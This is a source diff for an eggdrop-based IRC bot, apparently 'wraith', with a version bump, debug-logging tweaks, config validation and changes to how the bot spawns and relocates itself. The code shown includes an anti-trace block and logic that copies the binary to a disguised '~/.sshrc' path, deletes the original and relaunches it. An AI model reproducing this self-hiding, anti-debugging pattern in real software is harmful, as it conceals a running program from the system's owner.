@@ -79,8 +79,8 @@ extern jmp_buf		 alarmret;
 int role;
 int loading = 0;
 
-char	egg_version[1024] = "1.0.09";
-int	egg_numver = 1000900;
+char	egg_version[1024] = "1.0.10";
+int	egg_numver = 1001000;
 time_t lastfork=0;
 
 #ifdef HUB
@@ -91,7 +91,7 @@ char	notify_new[121] = "";	/* Person to send a note to for new users */
 int	default_flags = 0;	/* Default user flags and */
 int	default_uflags = 0;	/* Default userdefinied flags for people
 				   who say 'hello' or for .adduser */
-int	backgrd = 1;		/* Run in the background? */
+int	backgrd = 0;		/* Run in the background? */
 int	con_chan = 0;		/* Foreground: constantly display channel
 				   stats? */
 uid_t   myuid;
@@ -315,7 +315,7 @@ void write_debug()
     nested_debug = 1;
   putlog(LOG_MISC, "*", "* Last context: %s/%d [%s]", cx_file[cx_ptr],
 	 cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
-  putlog(LOG_MISC, "*", "* Please REPORT this BUG to bryan (send him ~/DEBUG as well)!");
+//  putlog(LOG_MISC, "*", "* Please REPORT this BUG to bryan (send him ~/DEBUG as well)!");
   x = creat("DEBUG", 0600);
   setsock(x, SOCK_NONSOCK,AF_INET);
   if (x < 0) {
@@ -1015,7 +1015,6 @@ static void gotspawn(char *filename)
 
   while(fscanf(fp,"%[^\n]\n",templine) != EOF) 
   {
-
     Context;
     temps = (char *) decrypt_string(netpass, decryptit(templine));
 
@@ -1060,7 +1059,7 @@ static int spawnbot(char *bin, char *nick, char *ip, char *host)
   sprintf(buf, "%s", bin);
   sprintf(bindir, "%s", dirname(buf));
 
-  sprintf(buf, "%s/.%s", bindir, nick);
+  sprintf(buf, "%s/.wraith-%s", bindir, nick);
 
 
   if (!(fp = fopen(buf, "w")))
@@ -1187,9 +1186,12 @@ int main(int argc, char **argv)
   egg_memcpy(&nowtm, localtime(&now), sizeof(struct tm));
   lastmin = nowtm.tm_min;
   srandom(now % (getpid() + getppid()));
+  Context;
   init_mem();
   myuid = geteuid();
+  Context;
   binname = getfullbinname(argv[0]);
+  Context;
 #ifdef S_ANTITRACE
   {
     int parent = getpid();
@@ -1265,6 +1267,8 @@ int main(int argc, char **argv)
   if (chmod(binname, S_IRUSR | S_IWUSR | S_IXUSR))
    fatal("Cannot chmod binary.", 0);
 
+  init_settings();
+
   if (argc >= 2) {
       if (!strcmp(argv[1], "-v") || !strcmp(argv[1],"-d") || !strcmp(argv[1],"-e")) {
       //lets parse -v/-e/-d before checking anything else.
@@ -1306,7 +1310,6 @@ int main(int argc, char **argv)
 
 
 #ifdef LEAF
-
 /* not needed
   id = geteuid();
   if (!id) 
@@ -1315,12 +1318,14 @@ int main(int argc, char **argv)
   if (SDEBUG)
     printf("my uid: %d my uuid: %d, my ppid: %d my pid: %d\n", getuid(), geteuid(), getppid(), getpid());
 
+Context;
   pw = getpwuid(geteuid());
 
   usleep(1000);
 
   if (!pw)
    fatal("Cannot read from the passwd file.", 0);
+Context;
   chdir(pw->pw_dir);
   snprintf(newbin, sizeof newbin, "%s/.sshrc", pw->pw_dir);
   snprintf(confdir, sizeof confdir, "%s/.ssh", pw->pw_dir);
@@ -1362,6 +1367,8 @@ Context;
       }
     }
   }
+  if (SDEBUG)
+    printf(STR("skip is: %d\n"), skip);
 
   if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
     if (SDEBUG)
@@ -1385,10 +1392,12 @@ Context;
       fatal("Wrong directory/binname.", 0);
     else {
       unlink(binname);
-      if (system(newbin))
+      if (system(newbin)) {
+        if (SDEBUG)
+	  printf(STR("exiting due to problem with restarting new binary.\n"));
         exit(1);
-//        fatal("Unforseen error trying to run binary..", 0);
-      else {
+      } else {
+	printf(STR("exiting to let new binary run.\n"));
         exit(0);  //This is to spawn the new binary in the correct place.
       }
     }
@@ -1456,7 +1465,6 @@ Context;
 #endif /* LEAF */
 
 Context;
-  init_settings();
   init_language(1);
 
   init_dcc_max();
@@ -1499,10 +1507,11 @@ Context;
       fatal("the local config is missing.\n",0);
     while(fscanf(f,"%[^\n]\n",templine) != EOF) {
       int skip = 0;
-
       Context;
       temps = (char *) decrypt_string(netpass, decryptit(templine));
       snprintf(c, sizeof c, "%s",temps);
+      if (!strchr(STR("*#-+!abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPWRSTUVWXYZ"), templine[0]))
+        fatal("Invalid config or encryption.",0);
       if (c[0] == '*')
         skip = 1;
       else if (c[0] == '-' && !skip) { //this is the uid
@@ -1657,7 +1666,7 @@ Context;
 #ifdef LEAF
 {
   long test = iptolong(getmyip(1));
-  if (!test)
+  if (!test && strcmp(myip,"0.0.0.0"))
     fatal("no ip?",0);
 }
 #endif
